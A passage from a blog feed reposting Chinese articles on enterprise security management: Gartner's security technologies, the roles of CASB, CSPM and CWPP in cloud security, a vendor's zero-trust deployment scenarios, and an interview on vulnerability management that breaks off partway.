Cycle中，容器安全目前处于新兴阶段。</p><p>3       其他新兴技术</p><p>除了上述11大顶级技术，Gartner还列举了一些正在兴起的其他新技术：</p><p><a href="/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022553304.png" class="gallery-item"><img src="/2021/08/25/%E9%80%90%E4%B8%80%E8%A7%A3%E8%AF%BBGartner%E8%AF%84%E5%87%BA%E7%9A%8411%E5%A4%A7%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/20210825022553304.png"></a></p><p>4       主要参考信息</p><p>1.       Gartner Identifies the Top Technologies for Security in 2017，<a href="https://www.gartner.com/newsroom/id/3744917"> https://www.gartner.com/newsroom/id/3744917</a>;</p><p>2.       Market Guide for Cloud Workload Protection Platforms, Gartner;</p><p>3.       Hype Cycle for Cloud Security, 2017, Gartner;</p><p>4.       It’s time to isolate your users from the Internet cesspool with remote browsing, Gartner;</p><p>5.       Magic Quadrant for Secure Web Gateways, 2017, Gartner;</p><p>6.       Competitive Landscape: Distributed Deception Platforms, 2016, Gartner;</p><p>7.       Market Guide for Endpoint Detection and Response Solutions, Gartner;</p><p>8.       Market Guide for Managed Detection and Response Services, Gartner;</p><p>9.       Technology Insight for Microsegmentation, Gartner;</p><p>10.   Magic Quadrant for Cloud Access Security Brokers, Gartner.</p><p>【参考】</p><p><a href="http://blog.51cto.com/yepeng/1962301"> Gartner: 2017年11大信息安全技术（解读版）</a></p><p><a href="http://yepeng.blog.51cto.com/3101105/1790115"> Gartner：2016年十大信息安全技术（含解读）</a></p><p><a href="http://yepeng.blog.51cto.com/3101105/1433222"> Gartner：2014年十大信息安全技术</a></p><p><a href="http://blog.51cto.com/yepeng/1962301"> </a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Gartner </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三大云安全工具（CASB、CSPM、CWPP）的使用场景</title>
      <link href="/2021/08/24/%E4%B8%89%E5%A4%A7%E4%BA%91%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%EF%BC%88CASB%E3%80%81CSPM%E3%80%81CWPP%EF%BC%89%E7%9A%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
      <url>/2021/08/24/%E4%B8%89%E5%A4%A7%E4%BA%91%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%EF%BC%88CASB%E3%80%81CSPM%E3%80%81CWPP%EF%BC%89%E7%9A%84%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="转自："><a href="#转自：" class="headerlink" title="转自："></a>转自：<p>安全客<br><a href="https://www.anquanke.com/post/id/194220">https://www.anquanke.com/post/id/194220</a><br><a href="https://pic3.zhimg.com/80/v2-09cc3fa09734bd2e3c9864c972ba2d1e_720w.jpg" class="gallery-item"><img src="https://pic3.zhimg.com/80/v2-09cc3fa09734bd2e3c9864c972ba2d1e_720w.jpg"></a><br>近年来，随着云计算市场的发展，不少企业都开始选择业务上云，并且企业并不只是采用一种云，而是采用多种云相互结合的方式，例如，公有云、私有云、混合云等等。企业采用多云方式已发展为主流趋势。<br>然而，业务上云之后也并非一劳永逸。由于云安全策略的制定总是滞后于云服务的使用，存储在云中的客户数据的泄露风险也相应增加。国内外的类似安全事件也层出不穷，例如今年，AWS托管的Capital One美国和加拿大1.06亿客户的个人数据发生泄露。下图比较形象地展示出，云计算还面临多账号权限管理、可视化问题以及一系列合规问题。</p><p><a href="https://pic1.zhimg.com/80/v2-0a752b0aa0a21c316177bd53fed53fd8_720w.jpg" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-0a752b0aa0a21c316177bd53fed53fd8_720w.jpg"></a></p><p>图1：云服务使用的理想状态和现实状况的差别<br>由于“云安全”的概念所涉范围非常广，本文只针对Gartner提出的比较流行的三类云安全产品进行阐述。Gartner曾提出三大云安全管理工具，分别是CASB、CSPM和CWPP。虽然这三大工具在一些功能上有所重叠，但三者之间更多是起到互补作用。下文首先简单介绍了三大安全工具在应用场景上的差别，然后介绍了三大云安全工具的详细应用情况。对于这三类产品不熟悉的读者可以阅读后文的详细内容。</p><p>责任共担与三大云安全工具的应用场景<br>为了切实解决云安全问题，供应商和企业都需要共同承担责任，双方各自负责处于其控制之下的技术。双方各自需要承担哪些职责，是由具体场景决定的：本地部署、IaaS、PaaS或SaaS（请参见图2）：<br>在传统的企业级IT场景下，所有基础架构均在本地运行，企业负责所有安全措施；<br>在IaaS场景下，云提供商负责保护后端数据中心、网络、服务器和虚拟化；企业负责保护有效负载，例如操作系统、数据库、安全性和应用程序。这种情况下，企业要负责保护自己在公有云中运行的工作负载；<br>而在PaaS这种无服务器场景下，企业则主要负责保护应用程序；<br>对于SaaS场景，应用程序和数据的安全性全部由服务提供商负责，而访问安全性则取决于企业及其用户。</p><p><a href="https://pic1.zhimg.com/80/v2-8729091d7d5564ab14d8c3e52f7cd7fc_720w.jpg" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-8729091d7d5564ab14d8c3e52f7cd7fc_720w.jpg"></a></p><p>图2：提供商和企业之间的职责划分<br>根据上文对企业和供应商责任的划分，我们可以针对不同场景选择不同的安全工具。图3很好地说明了三大安全工具适合哪类场景。首先从覆盖面积看，CWPP只覆盖了IaaS场景，这说明CWPP只适合IaaS服务。而CASB则覆盖了SaaS、PaaS、IaaS三个区域，但是主要覆盖面积体现在SaaS上，其应用场景也不言而喻。最后，根据CSPM的覆盖情况，也可以了解其主要是解决IaaS安全问题，同时能解决部分PaaS安全问题。</p><p><a href="https://pic4.zhimg.com/80/v2-67ee09058ad177e547d0bd96fdaac427_720w.jpg" class="gallery-item"><img src="https://pic4.zhimg.com/80/v2-67ee09058ad177e547d0bd96fdaac427_720w.jpg"></a></p><p>图3：三大云安全工具的覆盖范围关系图<br>CASB作为部署在客户和云服务商之间的安全策略控制点，是在访问基于云的资源时企业实施的安全策略。而CSPM产品通常使用自动化方式来解决云配置和合规性问题。CWPP作为一项以主机为中心的解决方案，主要是满足这些数据中心的工作负载保护需求，因此，主要适用于IaaS层。<br>下文将对适用于不同层面的三大安全工具分别进行详细讲解。</p><p>云访问安全代理（CASB）<br>CASB出现最早是为解决影子资产问题，尤其是随着SaaS服务的快速发展，从底层硬件资源到上层软件资源，最终用户都无法实施控制。而CASB能很好解决此类问题，并且很多用户在使用CASB产品之后，发现自身企业的云服务数量是他们所认知十倍之多。良好的使用效果，使CASB产品得到了快速发展。Gartner也曾预测，到2022年，将有60％的大型企业使用CASB。<br>CASB的功能主要是作为SaaS应用程序提供，偶尔也会用于本地的虚拟机和物理设备。在大多数用例中，SaaS交付明显更受欢迎。CASB核心价值是解决深度可视化、数据安全、威胁防护、合规性这四类问题。</p><p><a href="https://pic1.zhimg.com/80/v2-ac0500a44ce70f50a63dc01eb333e1a0_720w.jpg" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-ac0500a44ce70f50a63dc01eb333e1a0_720w.jpg"></a></p><p>图4：CASB的四大支柱<br>(1) 深度可视化—CASB提供了影子IT发现、组织机构云服务格局的统一视图以及从任何设备或位置访问云服务中数据的用户的详细信息。<br>(2) 数据安全性—CASB能够实施以数据为中心的安全策略，以防止基于数据分类、数据发现以及因监控敏感数据访问或提升权限等用户活动而进行有害活动。通常是通过审计、警报、阻止、隔离、删除和只读等控制措施来实施策略。DLP（数据丢失防护）功能很普遍，并且是仅次于可视化的最常用的一项控制措施。<br>(3) 威胁防护—CASB通过提供AAC来防止有害设备、用户和应用程序版本来访问云服务。可以根据登录期间和登录之后观察到的信号来更改云应用程序功能。CASB此类功能的其他示例包括通过嵌入式UEBA识别异常行为、威胁情报、网络沙箱以及恶意软件识别和缓解。<br>(4) 合规性—CASB可帮助组织机构证明，是组织机构在管理云服务的使用情况。CASB提供了信息来确定云风险偏好并确定云风险承受能力。通过各种可视化、控制和报告功能，CASB有助于满足数据驻留和法律合规性要求。<br>CASB可以通过API、转发代理、反向代理等方式来实现，如下图所示。</p><p><a href="https://pic1.zhimg.com/80/v2-31df63d196d716cc04c2299b85e49d48_720w.jpg" class="gallery-item"><img src="https://pic1.zhimg.com/80/v2-31df63d196d716cc04c2299b85e49d48_720w.jpg"></a></p><p>图5：CASB功能和架构集成模式概览</p><p>云安全配置管理（CSPM）<br>公有云IaaS和PaaS服务中的高度自动化和用户自助服务，更加突出了正确的云配置和合规性的重要性。一个错误就可能立即暴露出数千个系统或大量敏感数据。云服务的采用率不断增长，加之平台服务的数量不断增加，而云技能（包括安全性）却相对匮乏，这让企业信息和工作负载暴露无遗。雪上加霜的是，对程序化云基础架构缺乏全面了解，这意味着很长一段时间都不会发现配置不正确和不合规问题。这就导致了，即便底层的云提供商基础架构本身是安全的，但大多数企业都没有准确的流程、成熟工具或规模来确保安全使用云服务。<br>CSPM能够对基础设施安全配置进行分析与管理。这些安全配置包括账号特权、网络和存储配置、以及安全配置（如加密设置）。如果发现配置不合规，CSPM会采取行动进行修正。如图6所示，应该将CSPM视为一个持续改进和适应云安全态势的过程，其目标是降低攻击成功的可能性，以及在攻击者获得访问权限的情况下降低发生的损害。<br>由于云基础架构始终处于变化之中，因此，CSPM策略应该是在云应用的整个生命周期中进行持续评估和改进的一个策略，从研发开始一直延伸到运维（图6中从左到右），并在需要时做出响应和改进。同样，由于不断提出新的云功能，不断颁发新法规，云使用安全的策略也在不断变化。图6的顶部显示，CSPM策略应不断发展并适应新的情况、不断发展的行业标准和外部威胁情报，并根据在开发和运维中观察到的风险进行改进。</p><p><a href="https://pic2.zhimg.com/80/v2-ef580bbc4355065378a17d5f91493005_720w.jpg" class="gallery-item"><img src="https://pic2.zhimg.com/80/v2-ef580bbc4355065378a17d5f91493005_720w.jpg"></a></p><p>图6：CSPM的持续全生命周期方式</p><p>云工作负载保护平台（CWPP）<br>云工作负载保护平台（CWPP）市场是指以工作负载为中心的安全产品，旨在解决现代混合云、多云数据中心基础架构中服务器工作负载的独特保护要求。CWPP应该不受地理位置的影响，为物理机、虚拟机、容器和无服务器工作负载提供统一的可视化和控制力。CWPP产品通常结合使用网络分段、系统完整性保护、应用程序控制、行为监控、基于主机的入侵防御和可选的反恶意软件保护等措施，保护工作负载免受攻击。（关于CWPP产品市场近几年来的发展演进，请参考之前的《干货|CWPP产品市场演进》。）<br>图7显示了现代混合多云数据中心架构中工作负载保护策略的主要构成要素。</p><p><a href="https://pic2.zhimg.com/80/v2-2a8a0b4d7cc1577aa03cc49f62821d09_720w.jpg" class="gallery-item"><img src="https://pic2.zhimg.com/80/v2-2a8a0b4d7cc1577aa03cc49f62821d09_720w.jpg"></a></p><p>图7：CWPP控制措施层级结构图<br>图7是一个分层金字塔，底部是一个矩形基座。服务器工作负载的安全性源于阴影基础中良好的运维习惯。任何工作负载保护策略都必须从此处开始，并确保满足以下条件：<br>任何人（攻击者或管理员）都很难从物理和逻辑上访问工作负载。<br>工作负载镜像仅包含所需的代码。服务器镜像中应禁止使用浏览器和电子邮件。<br>需要通过严格管理流程，才能更改服务器工作负载，并且通过强制性强身份验证来严格控制管理访问。<br>收集和监控OS和应用程序日志。<br>对工作负载进行固化、缩小容量及打补丁，减少攻击面。</p><p>总结<br>目前，Gartner提出的三大云安全工具CASB、CSPM、CWPP，针对基础架构中IaaS、PaaS和SaaS层中的不同安全问题，给出了针对性的解决方案。虽然这三大工具不一定能全面覆盖所有安全问题，却也为企业在采用云服务时，加强安全控制措施指明了方向，提供了思路，可以更好地针对具体问题制定具体的解决方案。<br>当然未来，随着云服务的不断发展，安全控制措施肯定也会紧跟云服务的发展步伐，为云服务的发展保驾护航。</p><p>原文链接：<a href="https://link.zhihu.com/?target=https://www.anquanke.com/post/id/194220">https://www.anquanke.com/post/id/19</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 信息安全管理理念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于智慧安全3.0的零信任实践落地</title>
      <link href="/2021/08/17/%E5%9F%BA%E4%BA%8E%E6%99%BA%E6%85%A7%E5%AE%89%E5%85%A83.0%E7%9A%84%E9%9B%B6%E4%BF%A1%E4%BB%BB%E5%AE%9E%E8%B7%B5%E8%90%BD%E5%9C%B0/"/>
      <url>/2021/08/17/%E5%9F%BA%E4%BA%8E%E6%99%BA%E6%85%A7%E5%AE%89%E5%85%A83.0%E7%9A%84%E9%9B%B6%E4%BF%A1%E4%BB%BB%E5%AE%9E%E8%B7%B5%E8%90%BD%E5%9C%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="转自："><a href="#转自：" class="headerlink" title="转自："></a>转自：<p><a href="https://www.aqniu.com/wp-content/themes/anquanniu/images/aqniu-logo.svg" class="gallery-item"><img src="https://www.aqniu.com/wp-content/themes/anquanniu/images/aqniu-logo.svg"></a><br><a href="https://www.aqniu.com/industry/76452.html">https://www.aqniu.com/industry/76452.html</a></p><p>作者：<a href="https://www.aqniu.com/vip/nsfocus">绿盟科技</a>星期二, 八月 10, 2021</p><p>随着新基建和数字经济的加速建设，5G、云计算、大数据、人工智能等新技术、新应用不断深入发展， 网络安全正面临恶意程序样本泛滥、APT攻击持续演进、0-day漏洞等前所未有的挑战。同时，国家高度重视网络安全风险，《网络安全法》、《数据安全法》陆续出台，网络安全在IT架构中的分量日益加重。种种形势表明，安全已不只是合规的要求，需要更多的考虑业务全流程保障要求，从体系化角度去进行安全建设。</p><p>2021年，绿盟科技提出“智慧安全3.0”新战略，要求以体系化建设为指引，构建“全场景、可信任、实战化”的安全运营能力，达到“全面防护，智能分析，自动响应”的防护效果。“智慧安全3.0”将安全理念扩展到整个网络空间，并融入新的安全要素。“可信任”作为安全要素之一，提出安全建设要从业务视角出发，融入零信任思想，为用户构建访问信任模型，实现对用户业务环境的可信任保障。</p><p><strong>智慧安全3.0下的零信任</strong></p><p>零信任思想落地实践主要基于SDP、IAM、MSG等技术，在访问主体到访问客体之间，建立业务平面的安全访问通道，将控制平面零信任分析和控制平台作为零信任大脑，结合终端安全管理、统一身份认证等功能，构建多环节信任验证与访问控制、智能分析与风险识别、动态决策响应等能力。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2021/08/image001-15-1024x624.png" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2021/08/image001-15-1024x624.png"></a></p><p>1、<strong>多环节信任验证与访问控制</strong></p><p>零信任体系默认网络内部和外部的主体、客体均不可信，需要基于认证和授权动态，重构业务访问控制的信任基础。在访问过程中的各个环节，对终端、用户、应用、API的身份进行多种形式验证，结合业务场景及业务敏感程度，提供多层级可选的控制粒度。通过在每个阶段嵌入对应的安全访问控制策略执行点，实现应用和服务的动态控制，保证安全访问控制策略的有效实施。</p><p>2、<strong>智能分析与风险识别</strong></p><p>在零信任架构中，主体与客体之间的访问认证不是一次性的，需要进行持续评估，借助大数据引擎的强大算法，基于多维特征聚类的风险和威胁识别方法，通过对终端、网络和服务器端的访问全路径进行威胁监控，汇聚终端环境、访问频率、认证授权、攻击流量、越权访问等风险数据，智能化完成用户建模和行为分析，基于信任评估模型，识别安全风险。</p><p>3、<strong>动态策略自动化响应</strong></p><p>针对在零信任网络各对象动态变化的环境，基于零信任的策略控制引擎下发指令，从而确保在不断变化的过程中，始终具有可信条件的对象才能访问受控允许的资源。在整个访问过程中，依靠零信任的评估引擎和策略控制引擎，形成威胁研判的信任链，根据信任的紧迫度及危险程度等条件，按照响应优先级调用微场景化的通用Playbook执行脚本，实现对威胁的全局封堵、权限调整及用户二次认证等响应过程。</p><p>4、<strong>安全联动、打造一体化纵深防御</strong></p><p>零信任是一种安全理念，是对现有安全能力的一种完善和补充。绿盟科技“智慧安全3. 0”正是结合这种理念，实现安全体系的全面升级。“智慧安全3.0”从顶层设计开始定义安全体系并规划安全建设，已不只是考虑合规的要求，而是更多的考虑业务全流程保障要求，从体系化角度进行安全建设。“全场景”以全栈安全产品支撑解决方案，适应不同用户场景的需要，针对用户网络建设具备自适应攻击防护能力的纵深防御体系。“可信任”理念结合零信任模型，支撑用户构建可信任的能力，针对用户业务环境打造具备自适应访问保护能力的可信认证授权体系。最后通过基于“实战化“的安全运营体系，形成自适应攻击防护以及自适应访问保护能力的协同闭环机制，构建按需调度的安全能力。</p><p><strong>零信任场景化落地实践</strong></p><p>绿盟科技在研究零信任理论体系的同时，也很重视落地应用实践，于2014年启动零信任关键技术研究，2019年陆续发布多款关键产品，现在整体解决方案已在各个行业落地，对用户业务环境进行可信任保障。</p><p>1、<strong>暴露面隐藏场景</strong></p><p>在一些日常应用场景中，需要将内网的应用暴露到公网，并在公网进行访问操作，增加业务系统的安全风险。零信任架构可以将应用隐藏起来，基于SDP技术有效防止攻击者对企业应用的探测、扫描、渗透测试等，减少企业对外的攻击暴露面。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2021/08/image002-1-1024x551.png" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2021/08/image002-1-1024x551.png"></a></p><p>2、<strong>远程办公场景</strong></p><p>针对远程办公场景，绿盟科技“零信任”可以解决VPN访问形式线路不稳、存在横向移动、权限粗放等弊端。利用零信任架构的特点，用户无论是在企业内网还是互联网，都是不被信任的，必须先通过零信任体系认证，根据用户权限才能访问后台应用，最大限度地保证用户安全，便捷地访问企业内网应用。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2021/08/image003-10-1024x565.png" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2021/08/image003-10-1024x565.png"></a></p><p>3、<strong>远程运维访问管理</strong></p><p>在本地及远程运维场景中，运维人员管理不同应用时需登录不同堡垒机，而不同堡垒机存在安全认证策略不统一，没有统一入口，运维管理成本高等问题。零信任架构模型可以统一身份运维账号、统一入口、统一登录，零信任体系和堡垒机之间的联动也能对运维帐户进行动态管理，提高运维安全性和管理效率。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2021/08/image004-1024x576.png" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2021/08/image004-1024x576.png"></a></p><p><strong>4、全方位API防护场景</strong></p><p>针对API业务暴露公网会被黑产未授权调用，生成钓鱼路径，受害者报警等问题，零信任架构可以提供API安全代理与业务隐藏、调用者身份认证、权限控制等能力，实现对API场景的全方位安全防护。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2021/08/image005-13-1024x452.png" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2021/08/image005-13-1024x452.png"></a></p><p>5、<strong>SASE云上零信任安全</strong></p><p>随着企业数字化转型的深入发展，企业业务上云成为常态，针对业务上云之后的业务暴露面大、终端管控难、认证方式简单等问题，零信任架构可以以SD-WAN网络为基础，通过SDP、VPN等多种方式，快捷安全接入SASE，以零信任访问控制为核心，结合终端安全，满足高效运维运营、远程办公效率优化等场景需求。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2021/08/image006-1024x631.png" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2021/08/image006-1024x631.png"></a></p><p>面对数字化转型时代的网络安全挑战，用户可以基于“智慧安全3.0”蓝图，逐步将业务安全与零信任安全架构相融合，以此来构建完备的安全防护体系。绿盟科技也将凭借二十一年的网络安全技术能力积累，持续为用户业务的顺畅运行保驾护航。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 信息安全管理理念 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高效漏洞管理的六个锦囊</title>
      <link href="/2021/08/17/%E9%AB%98%E6%95%88%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E7%9A%84%E5%85%AD%E4%B8%AA%E9%94%A6%E5%9B%8A/"/>
      <url>/2021/08/17/%E9%AB%98%E6%95%88%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86%E7%9A%84%E5%85%AD%E4%B8%AA%E9%94%A6%E5%9B%8A/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h1 id="转自："><a href="#转自：" class="headerlink" title="转自："></a>转自：<p><a href="https://www.aqniu.com/wp-content/themes/anquanniu/images/aqniu-logo.svg" class="gallery-item"><img src="https://www.aqniu.com/wp-content/themes/anquanniu/images/aqniu-logo.svg"></a><br><a href="https://www.aqniu.com/learn/64973.html">https://www.aqniu.com/learn/64973.html</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>2019年以来，频发的漏洞攻击事件已经逐渐显露出一个不争的事实：不断增长的漏洞威胁迫使企业漏洞管理速度不得不提速。</p><p>近年，漏洞管理市场也在伴随着漏洞攻击事件稳步增长，市场已经有大量的漏洞评估产品，但是有效的漏洞管理却依然存在很大的改进空间。但是对于企业 CSO 和 CIO 来说，在投资或者选择新的漏洞管理或脆弱性风险管理相关工具产品和方案之前，都需要明确以下三点：</p><p>1. 知己：在内部漏洞发生的第一时间，如何快速圈定受灾资产的范围？并快速确定修复的优先级？</p><p>2. 知彼：如何对外部漏洞风险情况做长期跟进防范？</p><p>3. 百战不殆：如何在事件发生后进行快速响应，即根据漏洞优先级进行修复将系统风险降到最低？</p><p>今天，安全牛邀请了国内在漏洞管理方面颇具建树的青藤云安全的CEO张福为大家深度剖析如何做好漏洞管理，即漏洞管理问题如何才能做到 “知己，知彼，百战不殆”。</p><p><a href="https://www.aqniu.com/wp-content/uploads/2020/03/u37745603732556644961fm15gp0.jpg" class="gallery-item"><img src="https://www.aqniu.com/wp-content/uploads/2020/03/u37745603732556644961fm15gp0.jpg"></a></p><p>对于资产拥有者而言，漏洞是让人厌恶的东西。但对于黑客而言，漏洞则是他们最喜欢的“高价值资产”，它们可以为黑客带去源源不断的收益价值。举个简单例子，黑客通过系统漏洞进入服务器内部，一方面可以通过非法盗取数据信息在黑市上变现来获得经济收益，另一方面也可以将那些被控制的“肉鸡”作为攻击其它网络平台“滩头阵地”的武器。</p><p>层出不穷的漏洞让安全人员的工作不堪重负。但是，想要将所有漏洞一次性消除又几乎不可能。<strong>如果安全人员将注意力放在一些“无伤大雅”的小漏洞而长时间忽略严重的漏洞，这就犹如在粉刷一个随时会坍塌的屋顶一样滑稽。</strong>由于各个企业都有其自身的特点，因此需要对漏洞响应顺序进行优先级排序，需要了解每个漏洞对企业关键资产或业务造成威胁的严重程度。</p><p>正所谓，千里之堤，溃于蚁穴。一个小小的漏洞，也可能引发致命的危害。因此如何快速确定漏洞修复优先级，并以最快的速度修复关键漏洞成为了所有安全人员的头等大事。为此，根据我在网络安全服务领域多年来的从业经验，总结出了一个漏洞管理的关键策略：知己知彼，百战不殆。</p><h1 id="安全牛：从“知己”的角度，安全人员如何具备良好资产管理能力？"><a href="#安全牛：从“知己”的角度，安全人员如何具备良好资产管理能力？" class="headerlink" title="安全牛：从“知己”的角度，安全人员如何具备良好资产管理能力？"></a><strong>安全牛：从“知己”的角度，安全人员如何具备良好资产管理能力？</strong></h1><p><strong>张福：</strong>当企业运行良好、风平浪静的时候，资产管理往往显得不那么重要，但是当遇到攻击时，就会让安全运营人员明白谁才是安全防护的先决条件。例如，爆发高危漏洞时，如果安全人员无法确定有哪些资产受到该漏洞的影响，想要确定漏洞修复优先级就犹如盲人摸象，无从下手。</p><p>因此，安全人员一定需要拥有一个完整的资产视图，并且能够做到实时了解其动态变化，此为“知己”，亦是漏洞管理的前提。毕竟任何人都无法对未知的资产进行风险评估，而它们也会成为黑客手中可以随时引爆的“隐形炸弹”。</p><p>资产管理的重要性不言而喻，但是99%企业IT人员都不知道自己拥有哪些IT资产。据全球权威IT咨询机构Gartner调查分析，在数据中心内有近28%的物理服务器是幽灵服务器或者是僵尸服务器。对于这些处于休眠状态的服务器，日常没有任何补丁更新。在这种情况下，如果需要启动服务器，比如查看网站的旧版本时，该服务器将会成为企业IT环境中风险最高且最易受攻击的服务器。攻击者完全可以利用这些老旧系统的漏洞为跳板，通过横向渗透攻击技术进入内网来访问其它主机，获取包括邮箱、共享文件或凭证信息在内的敏感资源。在此基础上，进一步控制其它系统、提升权限或窃取更多有价值的数据。这对于企业的安全人员来说，简直就是一场噩梦。</p><p>因此，我认为，资产管理是安全的前提，但良好资产管理方案需具备以下二个方面的能力，包括资产清点的能力和资产关联的能力。</p><h1 id="安全牛：如何杜绝毫无意义的资产清点，做到真正意义上的看清-摸透企业资产呢？"><a href="#安全牛：如何杜绝毫无意义的资产清点，做到真正意义上的看清-摸透企业资产呢？" class="headerlink" title="安全牛：如何杜绝毫无意义的资产清点，做到真正意义上的看清/摸透企业资产呢？"></a><strong>安全牛：如何杜绝毫无意义的资产清点，做到真正意义上的看清/摸透企业资产呢？</strong></h1><p><strong>张福：</strong>企业必须清楚自己的所有资产（包括硬件和软件），比如自己企业中有哪些服务器，分别运行什么软件，它们是如何打补丁的？如果你不知道自己拥有什么，就很难回答上述这些基本问题。</p><p>之前，一位甲方企业安全人员就跟我抱怨每天都过得“提心吊胆”。每当网上爆出一个0Day漏洞，安全团队想要尽快确认受该漏洞影响的服务器范围，以便在最短时间内做出应对。但是，公司业务复杂，安全管理人员甚至不知道企业有多少服务器，在服务器上运行的应用更是数不胜数。因此，只能通过公司发文，要求各业务线提交自身业务系统的部署情况。接下来就是漫长的等待，等待厂商漏洞通告，编写检测脚本查找存在漏洞的主机，等待厂商的漏洞修复方法，编写修复脚本，最后一台一台修复问题主机。</p><p>在整个事件响应过程中，安全人员不知道业务部门上报的资产全不全，也不知道检测脚本是否扫描到所有包含漏洞的主机，更不知道在此期间是否有黑客已经入侵到企业内部。这个漫长的等待过程，那些脆弱的主机资产就犹如砧板上的“鱼肉”任黑客宰割，安全人员却如同局外人一般，束手无策。</p><h1 id="安全牛：请您谈谈如何判断企业资产之间的关联程度，以及如何界定各类资产的重要性等级？"><a href="#安全牛：请您谈谈如何判断企业资产之间的关联程度，以及如何界定各类资产的重要性等级？" class="headerlink" title="安全牛：请您谈谈如何判断企业资产之间的关联程度，以及如何界定各类资产的重要性等级？"></a><strong>安全牛：请您谈谈如何判断企业资产之间的关联程度，以及如何界定各类资产的重要性等级？</strong></h1><p>张福：资产的全面清点是资产管理的第一步，有助于企业生成完整的、不断更新的资产视图。但是如果针对资产收集的每条数据都很浅显，那么即使拥有完整的资产列表所能发挥的价值也是非常有限的。以主机资产为例，信息安全团队除了需要深入了解主机资产包括硬件规格、已安装的软件、已批准的账户、root权限和安装包等各方面信息，还需要了解这些资产之间的关联程度以及每类资产的重要性。</p><p>此时，如果拥有良好的资产管理，能够将资产数据通过API方式导入风险发现或入侵检测等其它系统并进行深度关联，这将会为安全人员采取安全防范措施提供极大帮助。例如，漏洞风险关联对应的软件应用状态，账号风险关联到对应的系统账号，反弹Shell关联对应的端口、进程等。只有这样，一旦现有资产存在对应风险或者被黑客入侵了，才能进行实时报警和提醒。</p><h1 id="安全牛：请您从从“知彼”的角度，谈谈安全人员该如何持续监控不断爆发的外部漏洞？"><a href="#安全牛：请您从从“知彼”的角度，谈谈安全人员该如何持续监控不断爆发的外部漏洞？" class="headerlink" title="安全牛：请您从从“知彼”的角度，谈谈安全人员该如何持续监控不断爆发的外部漏洞？"></a><strong>安全牛：请您从从“知彼”的角度，谈谈安全人员该如何持续监控不断爆发的外部漏洞？</strong></h1><p><strong>张福：</strong>除了对企业IT资产要有清晰而深入的了解，企业安全负责人还需要对外部漏洞风险情况有所了解才行，此为“知彼”。这包括行业协会、政府机构、学术研究人员、技术分析师和安全供应商等机构最新的漏洞披露情况。尤其是对那些可被利用的“零日”漏洞、可“横向移动”漏洞等外部风险状况需要格外注意。一旦发现新爆发的漏洞，应该立刻将漏洞规则包导入扫描系统，以便尽快对该漏洞进行检测。</p><p>虽然，黑客不会针对已发布的所有漏洞展开攻击，但他们会不断地扫描系统、软件中的关键漏洞。密歇根大学的一项研究表明，一台有开放端口或漏洞的服务器连网后，在23分钟内就会被攻击者扫描到，在56分钟内开始被漏洞探测，第一次被彻底入侵平均时间是19小时。</p><p>当然，扫描的频率决定了持续监控的可行性。如果每月扫描一次，甚至每个季度扫描一次，就很难为实时监控提供最新的数据信息。鉴于漏洞不断变化，因此，建议每天持续地扫描重要的、优先级高的核心资产。</p><h1 id="安全牛：当下漏洞扫描工具类型包括主动和被动两种-请您谈谈二者的区别？哪些需要深入监控、复杂的关键环境该如何选择风险评估工具？"><a href="#安全牛：当下漏洞扫描工具类型包括主动和被动两种-请您谈谈二者的区别？哪些需要深入监控、复杂的关键环境该如何选择风险评估工具？" class="headerlink" 